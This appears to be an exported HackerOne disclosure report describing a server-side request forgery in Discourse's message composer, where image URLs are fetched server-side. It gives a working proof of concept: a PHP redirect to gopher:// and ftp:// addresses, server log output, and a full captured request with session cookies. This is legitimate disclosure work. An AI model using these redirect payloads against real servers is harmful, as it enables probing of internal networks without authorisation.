{"id":228377,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjgzNzc=","url":"https://hackerone.com/reports/228377","title":"SSRF in upload IMG through URL","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-05-14T21:05:29.209Z","submitted_at":"2017-05-14T21:05:29.209Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mariuszpoplawski","url":"/mariuszpoplawski","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/43BtUKfowdJ8ZD7ZW4o2fnfM/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":16893,"url":"https://hackerone.com/discourse","handle":"discourse","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Discourse","twitter_handle":"discourse","website":"https://discourse.org","about":"Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-06-18T21:55:53.062Z","bug_reporter_agreed_on_going_public_at":"2017-05-19T21:55:49.135Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"-Short description\n\nPrivate message function is vulnerable is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse).\nread more at:\nhttps://cwe.mitre.org/data/definitions/918.html\n\n1. Load http://try.discourse.org\n2. Go to new message composer\n3. Set the receiver, topic \n4 set the message content\nTEST  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\n\n5. Set the malicious3.php file on your remote server to:\n\n\u003c?php\n        header('Location: gopher://192.166.218.53:80/test123');\n?\u003e\n\n6. Send the private message.\n\n7. Check your remote server, in my case \"192.166.218.53\" web logs file (access.log)\nOUTPUT :\n\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \"HEAD /malicious3.php HTTP/1.1\" 302 187 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \"GET /malicious3.php HTTP/1.1\" 302 225 \"-\" \"Ruby\"\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \"HEAD /test123 HTTP/1.1\" 404 140 \"-\" \"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\"\n\n-------------------------------------------------------------------------------------\n\n-  Request for FTP connection\n1. Load http://try.discourse.org\n2. Go to new message composer\n3. Set the receiver, topic\n4. set the message content\nTESTs  [![](http://192.166.218.53/malicious3.php)](http://192.166.218.53/malicious3.php)\n\n5. Set the malicious3.php file on your remote server to:\n\n\u003c?php\n        header('Location: ftp://192.166.218.53/');\n?\u003e\n\n6. Send the private message.\n\n7. Check your remote server, in my case \"192.166.218.53\" ftp  logs file. (vsftp.log).\nOUTPUT :\nSun May 14 15:29:40 2017 [pid 18354] CONNECT: Client \"::ffff:64.71.168.198\"\n\n-------------------------------------------------------------------------------------\n- Here is the burp suite request:\n\nPOST /posts HTTP/1.1\nHost: try.discourse.org\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nDiscourse-Visible: true\nX-Requested-With: XMLHttpRequest\nReferer: https://try.discourse.org/t/adsadas/835/7\nContent-Length: 437\nCookie: __utma=228756441.806995719.1494765035.1494768541.1494792827.3; __utmc=228756441; __utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERDRtQ1dKaDVtSFBEeFZXMTNsOEcrMG13Vzc3c1R3R2hJMUdNOHJHT0lHRU93U20waG5pajhRQTZVNmhGT0tVTmNZa1d6TW5HSVg3c2pvTUkrNjhNZFpwRHVyalFVSWVWa0ktLTdpcUxTWCs5dEhsVHRFekRDQ3FLUHc9PQ%3D%3D--3bf9351bc59d99d10f831dcc1e647054ddef3c41; __utmb=228756441.9.10.1494792827; _t=aebe2511952a805cec46af434b6617d5\nConnection: close\n\nraw=TESTa+%5B!%5B%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)\u0026unlist_topic=false\u0026category=\u0026topic_id=835\u0026is_warning=false\u0026archetype=regular\u0026typing_duration_msecs=100\u0026composer_open_duration_msecs=9183\u0026featured_link=\u0026image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bwidth%5D=24\u0026image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bheight%5D=24\u0026nested_post=true\n\n-------------------------------------------------------------------------------------\n\nThe attacker is able to send internal server side requests using Ruby client.\nCheck the attached screens for prove.\n\nWhy does the vulnerability exist?\n\ndiscourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and discourse will make such a FTP request.\n\nIf the description is not clear please feel free to ask us for more detailed report.\n\nregards www.afine.pl\n\n","vulnerability_information_html":"\u003cp\u003e-Short description\u003c/p\u003e\n\n\u003cp\u003ePrivate message function is vulnerable is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from  servers to any destination on the internet and discourse internal network and craft outgoing UDP-packet (for example, to connect to  FTP  servers from discourse).\u003cbr\u003e\nread more at:\u003cbr\u003e\n\u003ca title=\"https://cwe.mitre.org/data/definitions/918.html\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F918.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/918.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eLoad \u003ca title=\"http://try.discourse.org\" href=\"/redirect?url=http%3A%2F%2Ftry.discourse.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://try.discourse.org\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGo to new message composer\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSet the receiver, topic \u003cbr\u003e\n4 set the message content\u003cbr\u003e\nTEST  \u003ca href=\"/redirect?url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e![](http://192.166.218.53/malicious3.php)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eSet the malicious3.php file on your remote server to:\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\n        header(\u0026#39;Location: gopher://192.166.218.53:80/test123\u0026#39;);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eSend the private message.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCheck your remote server, in my case \u0026quot;192.166.218.53\u0026quot; web logs file (access.log)\u003cbr\u003e\nOUTPUT :\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e64.71.168.198 - - [14/May/2017:16:38:04 -0400] \u0026quot;HEAD /malicious3.php HTTP/1.1\u0026quot; 302 187 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\u0026quot;\u003cbr\u003e\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \u0026quot;GET /malicious3.php HTTP/1.1\u0026quot; 302 225 \u0026quot;-\u0026quot; \u0026quot;Ruby\u0026quot;\u003cbr\u003e\n64.71.168.198 - - [14/May/2017:16:38:04 -0400] \u0026quot;HEAD /test123 HTTP/1.1\u0026quot; 404 140 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36\u0026quot;\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cul\u003e\n\u003cli\u003e Request for FTP connection\u003c/li\u003e\n\u003cli\u003eLoad \u003ca title=\"http://try.discourse.org\" href=\"/redirect?url=http%3A%2F%2Ftry.discourse.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://try.discourse.org\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGo to new message composer\u003c/li\u003e\n\u003cli\u003eSet the receiver, topic\u003c/li\u003e\n\u003cli\u003eset the message content\nTESTs  \u003ca href=\"/redirect?url=http%3A%2F%2F192.166.218.53%2Fmalicious3.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e![](http://192.166.218.53/malicious3.php)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003col\u003e\n\u003cli\u003eSet the malicious3.php file on your remote server to:\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u0026lt;?php\u003cbr\u003e\n        header(\u0026#39;Location: \u003ca title=\"ftp://192.166.218.53/\u0026#39;\" href=\"/redirect?url=ftp%3A%2F%2F192.166.218.53%2F%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://192.166.218.53/\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\n?\u0026gt;\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\u003cp\u003eSend the private message.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eCheck your remote server, in my case \u0026quot;192.166.218.53\u0026quot; ftp  logs file. (vsftp.log).\u003cbr\u003e\nOUTPUT :\u003cbr\u003e\nSun May 14 15:29:40 2017 [pid 18354] CONNECT: Client \u0026quot;::ffff:64.71.168.198\u0026quot;\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003chr\u003e\n\n\u003cul\u003e\n\u003cli\u003eHere is the burp suite request:\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003ePOST /posts HTTP/1.1\u003cbr\u003e\nHost: try.discourse.org\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\u003cbr\u003e\nAccept: application/json, text/javascript, \u003cem\u003e/\u003c/em\u003e; q=0.01\u003cbr\u003e\nAccept-Language: en-US,en;q=0.5\u003cbr\u003e\nX-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==\u003cbr\u003e\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\u003cbr\u003e\nDiscourse-Visible: true\u003cbr\u003e\nX-Requested-With: XMLHttpRequest\u003cbr\u003e\nReferer: \u003ca title=\"https://try.discourse.org/t/adsadas/835/7\" href=\"/redirect?url=https%3A%2F%2Ftry.discourse.org%2Ft%2Fadsadas%2F835%2F7\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://try.discourse.org/t/adsadas/835/7\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nContent-Length: 437\u003cbr\u003e\nCookie: __utma=228756441.806995719.1494765035.1494768541.1494792827.3; __utmc=228756441; __utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERDRtQ1dKaDVtSFBEeFZXMTNsOEcrMG13Vzc3c1R3R2hJMUdNOHJHT0lHRU93U20waG5pajhRQTZVNmhGT0tVTmNZa1d6TW5HSVg3c2pvTUkrNjhNZFpwRHVyalFVSWVWa0ktLTdpcUxTWCs5dEhsVHRFekRDQ3FLUHc9PQ%3D%3D--3bf9351bc59d99d10f831dcc1e647054ddef3c41; __utmb=228756441.9.10.1494792827; _t=aebe2511952a805cec46af434b6617d5\u003cbr\u003e\nConnection: close\u003c/p\u003e\n\n\u003cp\u003eraw=TESTa+%5B!%5B%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)%5D(http%3A%2F%2F192.166.218.53%2Fmalicious3.php)\u0026amp;unlist_topic=false\u0026amp;category=\u0026amp;topic_id=835\u0026amp;is_warning=false\u0026amp;archetype=regular\u0026amp;typing_duration_msecs=100\u0026amp;composer_open_duration_msecs=9183\u0026amp;featured_link=\u0026amp;image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bwidth%5D=24\u0026amp;image_sizes%5Bhttp%3A%2F%2F192.166.218.53%2Fmalicious3.php%5D%5Bheight%5D=24\u0026amp;nested_post=true\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eThe attacker is able to send internal server side requests using Ruby client.\u003cbr\u003e\nCheck the attached screens for prove.\u003c/p\u003e\n\n\u003cp\u003eWhy does the vulnerability exist?\u003c/p\u003e\n\n\u003cp\u003ediscourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply \u003ca title=\"ftp://test.com/file\" href=\"/redirect?url=ftp%3A%2F%2Ftest.com%2Ffile\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://test.com/file\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as an URL and discourse will make such a FTP request.\u003c/p\u003e\n\n\u003cp\u003eIf the description is not clear please feel free to ask us for more detailed report.\u003c/p\u003e\n\n\u003cp\u003eregards \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.afine.pl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.afine.pl\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"64.0","formatted_bounty":"$64","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":184573,"file_name":"ftp_request.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/184/573/c43f6bdb5805d4b5258d62b35b6f6fa8ce09b814/ftp_request.png?response-content-disposition=attachment%3B%20filename%3D%22ftp_request.png%22%3B%20filename%2A%3DUTF-8%27%27ftp_request.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=df92c2bab582017c3a698dcfb072b22f0874cea5eafc1a7545f0906a1f6a2f96","file_size":613591,"type":"image/png"},{"id":184574,"file_name":"gopher.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/184/574/bd48729b1970aa5c96ca7a6744ca0fa18a8eda36/gopher.png?response-content-disposition=attachment%3B%20filename%3D%22gopher.png%22%3B%20filename%2A%3DUTF-8%27%27gopher.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=1bd6eb816ff2f2e6fa9bb50379fa6c6879f71ac915a5c216eae02b16033237fa","file_size":691147,"type":"image/png"},{"id":184575,"file_name":"request.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/184/575/77adf593d846d52ad02127afc6718aa17db458b3/request.png?response-content-disposition=attachment%3B%20filename%3D%22request.png%22%3B%20filename%2A%3DUTF-8%27%27request.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6Y3lMwIoUf05EQESF56DAXqAPPLzIguWqYse43Fu3rR0Kod4SRKI9ETYrP01wRz5xVgd2auQ8kejiA8344efyhQxkc3iBze4UukBtqzk604geJ6wyBSmoicpk9XqO8dvlhwhYEGoL4EWTozQffflzDAr6r%2FBTrqAb3yz5skpTmfiHh2mY%2FhHGiWzvhaSmhQ5tEgt4YCDEprvoxeYWkvlaxqdLXcMfRTr89qs4wuii5IpOn31c13IIFZzpa09Cs%2BExrDUX44ykH0g1zxLN374%2BwiIK3wd5v3201Stw8drFGqAKHIFBpAjuZIFF37RxSxGgAxlHskSrBBA1YzTX1SQV7r%2FcyXcvsAXO99Rr3E6FQFka96boq3PmqqeaoYxAs03IbehGcOPJ%2F3Ih7ebkxTDLG%2B75tCeMz1g%2BKNymUDx9%2B0KJfzKzXbCzi5TX8vNPGUyjZh2Y7SNRHBl7hFmGgXNktN5w%3D%3D\u0026X-Amz-Signature=631634cc0283e0df34be3507c6e0925766b9df9eb16ef06416b44329a74fd796","file_size":645257,"type":"image/png"},{"id":184576,"file_name":"request_output.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/184/576/0b8f08f7896e30cab5bbeaa8c3f9db9feab30a0d/request_output.png?response-content-disposition=attachment%3B%20filename%3D%22request_output.png%22%3B%20filename%2A%3DUTF-8%27%27request_output.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXJYPBHFQ%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T050338Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu4%2FXsLbLXL64kN0gTqrVP%2B6YQy0aFrAsl8mmpM3A02gIhAMCTWiWTqJYsWHj2mR6ExJkLtM%2BAer5nJ1p6uJxIO04QKrQDCFQQARoMMDEzNjE5Mjc0ODQ5IgyKVAfpOTinzYsPSPkqkQMwQonGdI9p7CuN4bjSzjzCvtK%2FWWqz3YU8bTMgRxd1lvP8n%2BmQUW%2FPjx22yWgMPRHSApDfLhipeKY57Ywk6GpNSLkFsR4mWXVTUZ3fv%2BFpIecsA7FNlVffsWQFQL1hvyVhQXlfUb877oYsLHI7rvsdEl2oxxoNNBVppK7LLDUZ5Hszb5rUUqEs3JeInglYJgHEk0JqpQ59Rfq6iusCJYxnpCRnEk4ATJ3WPY0fYnF5%2BrjplwvF9jvrWA8ORsehD7OObtIyHgdE%2BeHQJDIwKM12S2Z3doq1C1frQwXKFiUX0Y9ZT6Dew0nqLavJd23CiqxMaeH6L8Dme7K0ES6LXhVDxzX5ZM48Lw97Faf%2BmTRwYynJlpTsMle9l6X4AISAwVe8d6